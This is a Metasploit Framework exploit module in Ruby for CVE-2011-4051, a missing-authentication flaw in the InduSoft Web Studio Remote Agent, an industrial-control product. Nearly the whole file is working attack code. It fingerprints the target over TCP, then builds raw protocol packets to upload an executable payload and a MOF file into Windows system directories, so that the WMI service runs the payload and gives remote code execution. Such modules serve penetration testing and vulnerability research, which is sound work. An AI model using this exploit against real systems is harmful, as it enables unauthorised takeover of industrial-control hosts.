##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'InduSoft Web Studio Arbitrary Upload Remote Code Execution',
			'Description'    => %q{
					This module exploits a lack of authentication and authorization on the InduSoft
				Web Studio Remote Agent, that allows a remote attacker to write arbitrary files to
				the filesystem, by abusing the functions provided by the software.

				The module uses uses the Windows Management Instrumentation service to execute an
				arbitrary payload on vulnerable installations of InduSoft Web Studio on Windows pre
				Vista. It has been successfully tested on InduSoft Web Studio 6.1 SP6 over Windows
				XP SP3 and Windows 2003 SP2.
			},
			'Author'         =>
				[
					'Luigi Auriemma', # Vulnerability Discovery
					'juan vazquez' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2011-4051' ],
					[ 'OSVDB', '77179' ],
					[ 'BID', '50675' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-330' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'BadChars' => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP / 2003', { } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Nov 04 2011'))

		register_options([Opt::RPORT(4322)], self.class)
	end

	def check
		connect

		# Get Application version
		data = [0x14].pack("C")
		sock.put(data)
		app_info = sock.get_once
		disconnect

		if app_info =~ /InduSoft Web Studio v6\.1/
			return Exploit::CheckCode::Vulnerable
		elsif app_info =~ /InduSoft Web Studio/
			return Exploit::CheckCode::Detected
		end

		return Exploit::CheckCode::Safe

	end

	def upload_file(filename, my_payload)
		connect

		# Get Application version
		data = [0x14].pack("C")
		sock.put(data)
		app_info = sock.get_once
		if app_info !~ /InduSoft Web Studio/
			print_error("#{@peer} - InduSoft Web Sutio hasn't been detected, trying to exploit anyway...")
		end

		# Get Operating System
		data = [0x13].pack("C")
		sock.put(data)
		os_info = sock.get_once
		if os_info !~ /WINXP/ and os_info !~ /WIN2K3/
			print_error("#{@peer} - Exploitation through Windows Management Instrumentation service only works on windows pre-vista system, trying to exploit anyway...")
		end

		# Upload file

		data = "\x02\x37" # Command => Select destination
		data << [my_payload.length].pack("V") # Data length
		data << "#{filename}" # File name to upload
		data << "\x09\x00\x30\x00\x00\x00"
		data << "\x10\x03" # End of packet

		# The data must be split on 1024 length chunks
		offset = 0 # Data to send
		count = 1 # Number of chunks sent
		groups = 0 # Data must be sent in groups of 50 chunks

		chunk = my_payload[offset, 1024]

		while not chunk.nil?

			# If there is a group of chunks, send it
			if count % 51 == 0

				data << "\x02\x2c" # Command => Send group of chunks
				my_count = [count].pack("V") # Number of chunks
				data << my_count.gsub(/\x10/, "\x10\x10")
				data << "\x10\x03" # End of packet

				sock.put(data)
				res = sock.get_once
				if res !~ /\x02\x06\x10\x03/
					return res
				end

				count = count + 1
				groups = groups + 1
				data = ""

			end

			pkt = [ 0x02, 0x2e ].pack("C*") # Command => Chunk Data
			my_count = [count].pack("V")
			pkt << my_count.gsub(/\x10/, "\x10\x10") # Chunk ID
			pkt << [chunk.length].pack("V").gsub(/\x10/, "\x10\x10") # Chunk Data length
			pkt << chunk.gsub(/\x10/, "\x10\x10") # Chunk Data
			pkt << "\x10\x03" # End of packet

			data << pkt
			offset = (count - groups) * 1024
			chunk = my_payload[offset, 1024]
			count = count + 1
		end

		pkt = [ 0x02, 0x03].pack("C*") # Command => End of File
		my_count = [count].pack("V")
		pkt << my_count.gsub(/\x10/, "\x10\x10") # Chunk ID
		pkt << rand_text_alpha(8) # LastWriteTime
		pkt << rand_text_alpha(8) # LastAccessTime
		pkt << rand_text_alpha(8) # CreationTime
		pkt << "\x20\x00\x00\x00" # FileAttributes => FILE_ATTRIBUTE_ARCHIVE (0x20)
		pkt << rand_text_alpha(1)
		pkt << "\x10\x03" # End of packet
		data << pkt

		sock.put(data)
		res = sock.get_once
		disconnect

		return res

	end

	def exploit

		@peer = "#{rhost}:#{rport}"

		exe = generate_payload_exe
		exe_name = rand_text_alpha(rand(10)+5) + '.exe'

		mof_name = rand_text_alpha(rand(10)+5) + '.mof'
		mof      = generate_mof(mof_name, exe_name)

		print_status("#{@peer} - Uploading the exe payload to C:\\WINDOWS\\system32\\#{exe_name}")
		res = upload_file("C:\\WINDOWS\\system32\\#{exe_name}", exe)
		if res =~ /\x02\x06\x10\x03/
			print_good "#{@peer} - The exe payload has been uploaded successfully"
		else
			print_error "#{@peer} - Error uploading the exe payload"
			return
		end

		print_status("#{@peer} - Uploading the mof file to c:\\WINDOWS\\system32\\wbem\\mof\\#{mof_name}")
		res = upload_file("c:\\WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
		if res =~ /\x02\x06\x10\x03/
			print_good "#{@peer} - The mof file has been uploaded successfully"
		else
			print_error "#{@peer} - Error uploading the mof file"
			return
		end

	end

end
